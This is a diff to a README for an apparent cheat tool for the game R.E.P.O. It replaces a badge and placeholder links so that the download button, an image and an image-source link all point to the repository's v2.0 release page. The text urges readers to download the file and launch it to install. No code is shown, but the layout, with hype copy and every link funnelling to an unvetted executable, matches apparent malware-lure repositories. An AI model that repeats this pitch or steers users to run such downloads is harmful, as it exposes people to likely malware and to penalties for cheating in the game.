@@ -20,7 +20,7 @@ In this repository, you will find the necessary resources to utilize the cheat a
 
 To access the cheat and start using it in the game, simply download the cheat package from the following link:
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blue)](https://github.com/file/App.zip)
+[![Download Cheat](https://github.com/MOJI12356/r.e.p.o-cheat/releases/tag/v2.0)](https://github.com/MOJI12356/r.e.p.o-cheat/releases/tag/v2.0)
 
 If the link ends with the file name, make sure to launch the downloaded file to initiate the installation process. If you encounter any issues with the link or it is not working, please check the "Releases" section of this repository for alternative download options.
 
@@ -49,6 +49,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 By utilizing the "r.e.p.o-cheat" repository, you are taking the first step towards mastering R.E.P.O and dominating the game with enhanced capabilities. Download the cheat, unleash its power, and elevate your gaming experience today! 🚀🎮
 
-![R.E.P.O Cheat](https://example.com/image.png)
+![R.E.P.O Cheat](https://github.com/MOJI12356/r.e.p.o-cheat/releases/tag/v2.0)
 
-*Image Source: [Example Source](https://example.com)*
+*Image Source: [Example Source](https://github.com/MOJI12356/r.e.p.o-cheat/releases/tag/v2.0)*
